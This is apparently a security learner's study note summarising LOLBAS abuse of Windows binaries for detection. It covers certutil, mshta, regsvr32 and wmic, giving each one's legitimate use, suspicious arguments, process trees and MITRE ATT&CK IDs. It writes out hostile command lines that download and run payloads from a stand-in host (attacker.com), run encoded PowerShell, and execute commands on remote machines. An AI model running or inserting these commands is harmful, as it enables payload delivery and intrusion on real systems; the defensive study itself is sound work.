# Day 37 — LOLBAS Reference: 10 Binaries
 
**Date:** 2026-06-28
**Source:** lolbas-project.github.io
 
---
 
## 1. certutil.exe
 
**Legitimate purpose:** Certificate utility — manages certificates, certificate stores, and certificate policies on Windows. IT uses it to import/export certificates and verify certificate chains.
 
**How attackers abuse it:** Download files from the internet. certutil can fetch files from URLs using its `-urlcache` flag, and since it's a trusted Windows binary, many network security tools don't flag its outbound connections.
 
**Malicious command:**
```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```
 
**Suspicious arguments:** `-urlcache`, `-split`, `-f` followed by an HTTP/HTTPS URL, destination path in Temp or AppData
 
**Expected process tree (malicious):**
```
cmd.exe or powershell.exe
  └── certutil.exe -urlcache -split -f http://[IP]/payload.exe C:\Temp\payload.exe
```
 
**MITRE ATT&CK:** T1105 — Ingress Tool Transfer
 
---
 
## 2. mshta.exe
 
**Legitimate purpose:** Microsoft HTML Application Host — runs `.hta` files, which are HTML-based applications that can run scripts with elevated trust. Used by some legacy enterprise applications.
 
**How attackers abuse it:** Execute malicious scripts directly from URLs or inline VBScript/JScript. mshta can download and run code from an attacker-controlled URL in a single command.
 
**Malicious command:**
```cmd
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc [payload]""")
```
 
**Suspicious arguments:** Any URL as argument, inline vbscript: or javascript: protocol handlers
 
**Expected process tree (malicious):**
```
explorer.exe or office app
  └── mshta.exe http://attacker.com/payload.hta
        └── powershell.exe or cmd.exe [payload]
```
 
**MITRE ATT&CK:** T1218.005 — System Binary Proxy Execution: Mshta
 
---
 
## 3. regsvr32.exe
 
**Legitimate purpose:** Registers and unregisters OLE controls (DLLs and ActiveX controls) in the Windows registry. Used during software installation.
 
**How attackers abuse it:** Load and execute malicious DLLs or scripts. The "squiblydoo" technique uses regsvr32 to download and execute a scriptlet (.sct) file from a URL — bypasses application whitelisting because regsvr32 is a trusted binary.
 
**Malicious command:**
```cmd
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```
 
**Suspicious arguments:** `/i:` pointing to a URL, `scrobj.dll` as the target, `/u` flag combined with a URL
 
**Expected process tree (malicious):**
```
cmd.exe
  └── regsvr32.exe /s /n /u /i:http://[IP]/payload.sct scrobj.dll
        └── [spawned payload process]
```
 
**MITRE ATT&CK:** T1218.010 — System Binary Proxy Execution: Regsvr32
 
---
 
## 4. wmic.exe
 
**Legitimate purpose:** Windows Management Instrumentation Command-line. Used by admins to query system information, manage processes, and configure Windows settings remotely.
 
**How attackers abuse it:** Execute processes, query system info for reconnaissance, move laterally to remote machines, and spawn other processes in a way that can evade logging (the spawned process appears as a child of WMI rather than a child of the attacker's process).
 
**Malicious commands:**
```cmd
# Reconnaissance
wmic.exe /node:localhost product get name,version
 
# Execute process (parent obfuscation)
wmic.exe process call create "powershell.exe -enc [payload]"
 
# Remote execution (lateral movement)
wmic.exe /node:[target IP] process call create "cmd.exe /c [command]"
```
 
**Suspicious arguments:** `process call create` with PowerShell or cmd payload, `/node:` pointing to remote IPs
 
**Expected process tree (malicious):**
```
[attacker process]
  └── wmic.exe process call create "powershell.exe -enc [payload]"
        └── WmiPrvSE.exe (WMI provider host)
              └── powershell.exe [payload]
```
 
Note: the PowerShell spawns from WmiPrvSE.exe, not the original attacker process — this is the parent obfuscation benefit.
 
**MITRE ATT&CK:** T1047 — Windows Management Instrumentation
 
---

